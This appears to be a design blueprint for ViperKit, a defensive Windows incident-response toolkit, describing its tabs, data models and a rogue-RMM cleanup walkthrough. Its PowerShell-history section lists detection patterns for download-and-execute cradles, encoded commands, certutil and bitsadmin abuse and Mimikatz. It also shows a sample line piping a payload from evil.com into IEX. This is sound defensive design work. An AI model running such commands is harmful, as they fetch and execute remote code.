# ViperKit — Master Blueprint v4.0

**Owner:** Jeremy Tarkington
**Codename:** ViperKit
**Brand:** VENOMOUSVIPER
**Last Updated:** 2024-11-23

---

## 1. Purpose

ViperKit is a **portable, offline-first incident response toolkit** for Windows.

**Target User:** MSP engineers, IT staff, and Tier 1/2 help desk technicians **without** a full-time security team or extensive cybersecurity experience.

ViperKit is a **guided incident workflow** that walks a tech from:

> "I think this box is compromised"
> → Hunt for the bad tool
> → Persist to see what keeps it alive
> → Sweep to see what landed with it
> → Cleanup to remove it safely
> → Harden to prevent reinfection
> → Case Export to document everything

---

## 2. What ViperKit Is NOT

- Not an AV/EDR replacement
- Not automatic malware removal or "one-click fix everything"
- Not cloud-dependent (core features work fully offline)
- Not just a persistence scanner

---

## 3. Core Concept: Case Focus

**Case Focus** is a global list of targets for the current investigation. Think of it as tags that follow you across all tabs.

### Examples of Focus Items
```
ConnectWiseControl.Client.exe
ScreenConnect Client
LogMeIn
powershell.exe
C:\Program Files\EasyHelp\agent.exe
```

### How Focus Works

1. **Focus is additive** — Items get added from any tab, never overwritten
2. **Focus carries across tabs** — Set it in Hunt, see highlights in Persist and Sweep
3. **Focus includes timestamps** — When focus target is a file path, its install time is captured for temporal clustering

### Adding to Focus
- **Hunt:** Find suspicious item → "Add to focus"
- **Persist:** See suspicious persistence → "Add to focus"
- **Sweep:** See related artifact → "Add to focus"

---

## 4. The Workflow

```
┌─────────────────────────────────────────────────────────────────────┐
│  1. HUNT     Find the bad thing (IOC, tool name, file)              │
│              → Set as "Case Focus"                                  │
│                                                                     │
│  2. PERSIST  Check if the bad thing has persistence                 │
│              → Services, autoruns, tasks highlighted if focus match │
│              → Check PowerShell history for attacker commands       │
│                                                                     │
│  3. SWEEP    Find OTHER things installed at the same time           │
│              → Temporal clustering (±1-8h of focus target install)  │
│              → Add related items to focus                           │
│                                                                     │
│  4. PERSIST  Re-run with expanded focus                             │
│              → Now see persistence for ALL suspicious items         │
│                                                                     │
│  5. CLEANUP  Remove identified threats safely                       │
│              → Preview → Execute → Undo if needed                   │
│                                                                     │
│  6. HARDEN   Prevent reinfection                                    │
│              → Apply security controls based on what was found      │
│                                                                     │
│  7. CASE     Export full case report with timeline                  │
└─────────────────────────────────────────────────────────────────────┘
```

---

## 5. Tab Specifications

### 5.1 Dashboard — COMPLETE

**Role:** Entry point overview and case status.

**Features:**
- System snapshot (hostname, user, OS)
- Case ID and event count
- Last event summary
- Case export button
- Status messages
- Demo Mode panel (planned)

**Behavior:**
- Dashboard reflects the workflow, it doesn't control it
- Updates automatically as events are logged

---

### 5.2 Hunt — COMPLETE

**Role:** Find suspicious tools, binaries, and artifacts.

**IOC Types:**
| Type | What It Does |
|------|--------------|
| File/Path | Check existence, show metadata, calculate hashes (MD5/SHA1/SHA256) |
| Hash | Identify hash type, optional disk scan for matches |
| Domain/URL | DNS lookup, HTTP probe |
| IP | Reverse DNS, ping test |
| Registry | Open key, enumerate values |
| Name/Keyword | Search processes, Program Files, ProgramData, scoped file search |

**Actions:**
- Run Hunt
- Set as Case Focus (adds target to focus list)
- Open Location
- Copy Target
- Save Results

**Case Logging:**
- All hunts logged with IOC, type, and results
- Focus changes logged

---

### 5.3 Persist — COMPLETE

**Role:** Map all persistence mechanisms and highlight focus matches.

**Persistence Locations Scanned:**
| Location | Details |
|----------|---------|
| Registry Run/RunOnce | HKCU + HKLM + Wow6432Node variants |
| Winlogon | Shell, Userinit hijacks |
| IFEO | Debugger hijacks |
| AppInit_DLLs | DLL injection points |
| Startup Folders | All users + current user |
| Services & Drivers | Auto-start only |
| Scheduled Tasks | All tasks with enabled triggers |
| PowerShell Profiles | All profile locations |

**Risk Assessment:**
| Level | Meaning | Color |
|-------|---------|-------|
| CHECK | Needs investigation | Red |
| NOTE | Informational (stale entry, etc.) | Amber |
| OK | Normal/expected | Green |

**High-Signal Detection:**
- IFEO entries (always suspicious)
- Winlogon modifications
- AppInit_DLLs
- PowerShell profiles
- Suspicious paths in autoruns

**Features:**
- Summary panel with triage counts
- Severity color badges
- Focus highlighting (pink border)
- MITRE ATT&CK mapping
- Publisher extraction
- Multiple filters (severity, location, text search)
- Add to Cleanup queue

**Actions:**
- Run Persistence Scan
- Scan PowerShell History (planned)
- Add to Focus
- Add to Case
- Add to Cleanup
- Investigate (open location/regedit)
- Copy/Save Results

---

### 5.4 Sweep — COMPLETE

**Role:** Find what else was installed around the same time as focus targets.

**Scan Locations:**
- All user profiles (Desktop, Downloads, AppData, Temp)
- ProgramData
- Startup folders
- Services & drivers

**File Types:**
- Executables (.exe, .dll, .com, .scr, .sys)
- Scripts (.ps1, .vbs, .js, .bat, .cmd)
- Installers (.msi)
- Archives (.zip, .7z, .rar, .iso)

**Severity Levels:**
| Level | Criteria |
|-------|----------|
| HIGH | EXE/script/driver in Desktop/Downloads/Startup, or very recent (<4h) in AppData/Temp |
| MEDIUM | Older EXE/script/driver in AppData/Temp, or DLLs there |
| LOW | Everything else (still logged) |

**Clustering (Key Feature):**

When focus targets are set, Sweep performs clustering:

| Cluster Type | Border Color | Meaning |
|--------------|--------------|---------|
| Focus Match | Pink | Item name/path contains focus target term |
| Time Cluster | Orange | Item modified within ±1-8h of focus target's timestamp |
| Folder Cluster | Blue | Item is in same directory tree as focus target |

**Cluster Window:** Configurable: ±1h, ±2h, ±4h, ±8h

**Features:**
- Summary panel with counts
- Severity color badges
- Focus targets display with timestamps
- "Cluster hits only" filter
- Investigate button (SHA256 hash + VirusTotal lookup)
- Add to Cleanup queue

**Actions:**
- Run Sweep
- Add to Focus
- Add to Case
- Add to Cleanup
- Investigate (hash + VirusTotal)
- Open Location
- Copy/Save Results

---

### 5.5 Cleanup — COMPLETE

**Role:** Safely remove identified threats with undo capability.

**Supported Actions:**
| Action | What It Does | Backup | Undo |
|--------|--------------|--------|------|
| Quarantine file | Move to `C:\ViperKit_Quarantine\{CaseId}\` | Original path recorded | Yes |
| Disable service | Stop service, set Start=4 (Disabled) | Original Start value | Yes |
| Disable scheduled task | schtasks /Change /Disable | N/A | Yes (re-enable) |
| Delete registry key | reg delete | Export to .reg file | Yes |

**Features:**
- Queue items from Persist and Sweep tabs
- Execute all pending / execute selected
- Stats display (total, pending, completed, failed)
- Undo last action / undo selected
- Remove from queue / clear queue
- Open quarantine folder
- Journal persistence (JSON file per case)
- Detail panel for selected item

**Workflow:**
1. Items added from Persist/Sweep via "Add to Cleanup" button
2. Review queue, see severity and source
3. Execute selected or all pending
4. If mistake: Undo to restore original state
5. Quarantined files preserved for analysis

**Case Logging:**
- Item added to queue
- Item executed (with result)
- Item undone

---

### 5.6 Harden — NOT STARTED

**Role:** Apply targeted defenses based on what was found.

**Planned Recommendations:**
- For rogue RMMs: AppLocker/SRP rules, firewall restrictions
- For scripts in Temp: Block execution from user-writable locations
- For PowerShell abuse: Enable Script Block Logging

**Planned Features:**
- Standard/Strict profiles
- Rollback capability
- Integration with Case Targets

---

### 5.7 Case — PARTIAL

**Role:** Timeline of everything that happened, exportable report.

**Current Features:**
- Event logging from all tabs
- Focus targets display
- Text file export

**Planned Features:**
- Chronological timeline view
- Case Targets list
- HTML/Markdown report generation
- Artifacts ZIP bundle
- Operator notes

---

### 5.8 Help — NOT STARTED

**Role:** Quick reference for operators.

**Planned Content:**
- Safety rules ("Preview everything, export before applying")
- Tab-by-tab usage guide
- Log/report locations
- Keyboard shortcuts

---

### 5.9 Demo Mode — PLANNED

**Role:** Guided walkthrough for training and proof-of-concept demonstrations.

**Location:** Dashboard tab

**User Story:** As a new user or sales engineer, I want to run a guided demo that creates realistic test artifacts so that I can see how ViperKit detects and handles threats without needing a real incident.

#### Demo Artifacts

| Artifact | Type | Path | Purpose |
|----------|------|------|---------|
| DemoRMM.exe | File | `%ProgramFiles%\ViperKit_Demo\DemoRMM.exe` | Fake RMM executable (empty/benign) |
| helper.ps1 | Script | `%TEMP%\ViperKit_Demo\helper.ps1` | Suspicious script in temp |
| DemoRMM Run Key | Registry | `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\DemoRMM` | Persistence via Run key |
| DemoTask | Task | `\ViperKit_Demo\DemoTask` | Scheduled task (created disabled) |
| config.dat | File | `%APPDATA%\ViperKit_Demo\config.dat` | Suspicious data file |

#### Walkthrough Steps

| Step | Tab | Action | What User Learns |
|------|-----|--------|------------------|
| 1 | Hunt | Search "DemoRMM", set as focus | How to find and track suspicious items |
| 2 | Persist | Run scan, see highlighted entries | How focus highlighting works |
| 3 | Sweep | See time-clustered files | How temporal clustering finds related artifacts |
| 4 | Cleanup | Add items to queue | How to prepare for remediation |
| 5 | Cleanup | Execute cleanup | How safe removal works |
| 6 | Complete | Summary | Full workflow recap |

#### UI Design

```
┌────────────────────────────────────────────────────────────┐
│ 🎯 DEMO MODE                                                │
│                                                             │
│ Learn ViperKit with a guided walkthrough using harmless     │
│ test artifacts. Perfect for training and proof-of-concept.  │
│                                                             │
│ [▶ Start Demo Mode]    [📖 View Demo Guide]                 │
│                                                             │
│ Status: Ready                                               │
└────────────────────────────────────────────────────────────┘

┌────────────────────────────────────────────────────────────┐
│ 📋 DEMO WALKTHROUGH (visible after demo starts)            │
│ ┌────────────────────────────────────────────────────────┐ │
│ │ Step 1 of 6: Hunt the suspicious tool                  │ │
│ │                                                         │ │
│ │ Go to the HUNT tab and search for "DemoRMM"            │ │
│ │                                                         │ │
│ │ What you'll find:                                       │ │
│ │ • DemoRMM.exe in Program Files                         │ │
│ │ • Process info and file metadata                        │ │
│ │                                                         │ │
│ │ 💡 Click "Set as case focus" to track this target      │ │
│ │                                                         │ │
│ │ [← Previous]  Step 1/6  [Next →]  [End Demo]           │ │
│ └────────────────────────────────────────────────────────┘ │
└────────────────────────────────────────────────────────────┘
```

#### Safety Measures

- All paths include "ViperKit_Demo" folder for easy identification
- Scheduled task created in disabled state (never executes)
- Executables are empty/benign placeholder files
- Full cleanup guaranteed when demo ends
- User confirmation required before creating artifacts

#### Data Models

```csharp
public class DemoArtifact
{
    public string Id { get; set; }
    public string ArtifactType { get; set; }  // File, Registry, Task, Script
    public string Name { get; set; }
    public string Path { get; set; }
    public string Description { get; set; }
    public bool IsCreated { get; set; }
    public bool IsCleanedUp { get; set; }
}

public class DemoStep
{
    public int StepNumber { get; set; }
    public string Title { get; set; }
    public string TabTarget { get; set; }
    public string Instructions { get; set; }
    public string SearchTerm { get; set; }
    public string ExpectedFindings { get; set; }
    public string Tip { get; set; }
}

public static class DemoManager
{
    public static bool IsDemoActive { get; }
    public static int CurrentStep { get; }
    public static void StartDemo();
    public static void CleanupDemo();
    public static void NextStep();
    public static void EndDemo();
}
```

#### Implementation Files

- `Models/DemoManager.cs` - Demo state and artifact management
- `Models/DemoArtifact.cs` - Artifact data model
- `Views/MainWindow.Demo.cs` - Demo logic partial class
- Update `MainWindow.axaml` - Add demo panel to Dashboard

---

### 5.10 PowerShell History Analysis — PLANNED

**Role:** Analyze PowerShell command history to identify attacker activity.

**Location:** Persist tab (new section)

**User Story:** As an incident responder, I want to see what PowerShell commands were executed on this machine so that I can understand what actions an attacker may have taken.

#### History File Locations

| Version | Path | Notes |
|---------|------|-------|
| Windows PowerShell 5.1 | `%USERPROFILE%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt` | Default location |
| PowerShell 7.x | `%USERPROFILE%\AppData\Roaming\Microsoft\PowerShell\PSReadLine\ConsoleHost_history.txt` | PowerShell Core |
| All Users | `C:\Users\*\AppData\Roaming\Microsoft\...` | Requires admin elevation |

#### Risk Scoring Rules

**HIGH Risk Indicators:**
```
Invoke-WebRequest + IEX/Invoke-Expression
Invoke-RestMethod + IEX
(New-Object Net.WebClient).DownloadString
-enc / -EncodedCommand
FromBase64String
Start-Process with suspicious args
Invoke-Mimikatz, Invoke-Kerberoast (known tools)
certutil -decode
bitsadmin /transfer
```

**MEDIUM Risk Indicators:**
```
Set-ExecutionPolicy Bypass/Unrestricted
New-ScheduledTask, Register-ScheduledTask
New-Service, Set-Service
Add-MpPreference -ExclusionPath (Defender exclusions)
Disable-WindowsOptionalFeature
netsh advfirewall
reg add (registry modifications)
net user, net localgroup (user management)
```

**LOW Risk:**
- Get-* commands (reconnaissance but common)
- Normal administrative commands
- Everything else

#### UI Design

```
┌─ PowerShell History Analysis ────────────────────────────────────────┐
│                                                                       │
│ Summary: Found 847 commands across 3 profiles                        │
│ ┌────────┐ ┌────────┐ ┌────────┐ ┌────────┐                         │
│ │ 12     │ │ 34     │ │ 801    │ │ 2      │                         │
│ │ HIGH   │ │ MEDIUM │ │ LOW    │ │ Users  │                         │
│ └────────┘ └────────┘ └────────┘ └────────┘                         │
│                                                                       │
│ Filter: [All Severities ▼]  [All Users ▼]  [Search...          ]    │
│ ☑ Show only suspicious (HIGH/MEDIUM)                                 │
│                                                                       │
│ ┌─────────────────────────────────────────────────────────────────┐ │
│ │ ⚠ HIGH │ jsmith │ PS 5.1                                        │ │
│ │ Invoke-WebRequest -Uri "http://evil.com/payload.ps1" | IEX      │ │
│ │ Detected: Download + Execute pattern                             │ │
│ ├─────────────────────────────────────────────────────────────────┤ │
│ │ ⚠ HIGH │ admin │ PS 7                                           │ │
│ │ powershell -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0... │ │
│ │ Detected: Base64 encoded command                                 │ │
│ │ [Decode] → Invoke-WebRequest -Uri "http://..."                  │ │
│ └─────────────────────────────────────────────────────────────────┘ │
│                                                                       │
│ [Copy Selected]  [Add to Case]  [Decode Base64]  [Export All]        │
└───────────────────────────────────────────────────────────────────────┘
```

#### Data Models

```csharp
public class PowerShellHistoryEntry
{
    public string Id { get; set; }
    public string Command { get; set; }
    public string UserProfile { get; set; }
    public string PowerShellVersion { get; set; }  // "5.1" or "7"
    public string HistoryFilePath { get; set; }
    public int LineNumber { get; set; }

    // Risk assessment
    public string Severity { get; set; }  // HIGH, MEDIUM, LOW
    public string RiskReason { get; set; }
    public List<string> RiskIndicators { get; set; }

    // For encoded commands
    public bool IsEncoded { get; set; }
    public string DecodedCommand { get; set; }

    // UI helpers
    public string SeverityBackground { get; }
    public string SeverityForeground { get; }
}

public class PowerShellHistoryResult
{
    public List<PowerShellHistoryEntry> Entries { get; set; }
    public int TotalCommands { get; set; }
    public int HighRiskCount { get; set; }
    public int MediumRiskCount { get; set; }
    public int LowRiskCount { get; set; }
    public int UsersScanned { get; set; }
    public List<string> HistoryFilesFound { get; set; }
    public List<string> Errors { get; set; }
}
```

#### Features

- Scan all PSReadLine history files
- Scan all user profiles when running elevated
- Risk scoring with pattern matching
- Base64 decoding for encoded commands
- Filter by severity, user, search text
- Add suspicious commands to case notes
- Export all findings

#### Safety Considerations

- **Read-Only:** Never modify or delete PowerShell history files
- **Privacy Note:** Alert that history may contain sensitive info
- **No Execution:** Never execute decoded commands, only display
- **Access Rights:** Handle permission errors gracefully

#### Implementation Files

- `Models/PowerShellHistoryEntry.cs` - Entry data model
- `Models/PowerShellHistoryResult.cs` - Result container
- `Views/Persist.PowerShellHistory.cs` - Scan and analysis logic
- Update `MainWindow.axaml` - Add PS History section to Persist tab
- Update `MainWindow.Persist.cs` - Wire up button handlers

---

## 6. Example Workflow: Rogue RMM Cleanup

**Scenario:** Attacker installed ScreenConnect, EasyHelp, and PowerShell 7. ScreenConnect keeps coming back after "uninstall."

### Step 1: Hunt
```
Search: "ScreenConnect"
Find: ScreenConnect.ClientService.exe
Action: Add to Focus

Search: "EasyHelp"
Find: C:\Program Files\EasyHelp\easyhelp.exe
Action: Add to Focus

Search: "PowerShell 7"
Find: C:\Program Files\PowerShell\7\pwsh.exe
Action: Add to Focus
```

### Step 2: Persist
```
Run: Persistence scan
See:
  - ScreenConnect service (highlighted - focus match)
  - Scheduled task pointing to EasyHelp (highlighted)
  - Run key for PowerShell 7 (highlighted)
Action: Add suspicious entries to case log

Run: PowerShell History scan
See:
  - HIGH: Invoke-WebRequest downloading ScreenConnect installer
  - MEDIUM: Set-ExecutionPolicy Bypass
Action: Add suspicious commands to case
```

### Step 3: Sweep
```
Settings: 7-day lookback, ±2h cluster window
Run: Sweep scan
See:
  - ScreenConnect.Setup.msi (TIME CLUSTER - installed same time)
  - helper.ps1 in AppData (TIME CLUSTER)
  - EasyHelp DLLs (FOLDER CLUSTER)
Action: Add installer and script to focus
```

### Step 4: Persist (Second Pass)
```
Run: Persistence scan again
See: Additional persistence for newly-added focus items
Result: Complete map of all persistence tied to the infection
```

### Step 5: Cleanup
```
See: Grouped checklist by target
  - ScreenConnect: 2 services, 1 task, 3 files
  - EasyHelp: 1 service, 1 folder
  - PowerShell 7: 1 run key
Action: Add to cleanup queue, execute
```

### Step 6: Harden (Coming)
```
See: Recommendations based on findings
  - Block known RMM paths in AppLocker
  - Block execution in %TEMP%
  - Enable Script Block Logging
Action: Apply controls, mark as applied
```

### Step 7: Case Export
```
Action: Export case report
Result: Complete narrative suitable for ticket/IR documentation
```

---

## 7. Technical Implementation

### Case Manager API
```csharp
CaseManager.StartNewCase()              // Create new case with system snapshot
CaseManager.SetFocusTarget(target, tab) // Add to focus list (appends, doesn't overwrite)
CaseManager.GetFocusTargets()           // Get all focus items
CaseManager.ClearFocus(tab)             // Clear all focus items
CaseManager.AddEvent(tab, action, severity, target, details) // Log event
CaseManager.AddToCleanupQueue(item)     // Add item to cleanup queue
CaseManager.GetCleanupQueue()           // Get cleanup queue
CaseManager.ExportToFile()              // Generate case report
```

### Data Models

**HuntResult:** Category, Target, Severity, Summary, Details

**PersistItem:** Name, Path, RegistryPath, Source, LocationType, Risk, Reason, MitreTechnique, Publisher, IsFocusHit, RiskBackground, FocusBorderBrush

**SweepEntry:** Category, Severity, Path, Name, Source, Reason, Modified, IsFocusHit, IsTimeCluster, IsFolderCluster, ClusterTarget, SeverityBackground, ClusterBorderBrush

**CleanupItem:** Id, ItemType, Name, OriginalPath, QuarantinePath, SourceTab, Severity, Reason, Action, Status, AddedAt, ExecutedAt, ErrorMessage

**CleanupJournalEntry:** ItemId, ActionType, Timestamp, OriginalState, NewState, BackupData, IsUndone, CaseId

**CaseEvent:** Timestamp, Tab, Action, Severity, Target, Details

---

## 8. UI Design Principles

1. **Summary panels first** — Show triage counts before the wall of data
2. **Color badges** — Instant visual severity recognition
3. **Focus highlighting** — Colored borders for focus/cluster matches
4. **Filter, don't hide** — When filters yield zero, show all with status message
5. **Actions at the bottom** — Consistent button placement across tabs
6. **Case logging everywhere** — Every significant action recorded
7. **Dark theme** — Professional look with VENOMOUSVIPER branding

---

## 9. Next Development Steps

1. **PowerShell History Analysis** — Add to Persist tab
   - High forensic value
   - Helps understand attacker actions
   - Risk scoring identifies malicious commands

2. **Demo Mode** — Add to Dashboard
   - Training and POC capability
   - Creates harmless test artifacts
   - Guided walkthrough of full workflow

3. **Harden tab** — Security profile application
   - Standard/Strict profiles
   - Rollback capability

4. **Help tab** — User documentation
   - Safety rules
   - Tab usage guide

5. **Case tab enhancements** — Better reporting
   - HTML report generation
   - Artifacts ZIP bundle
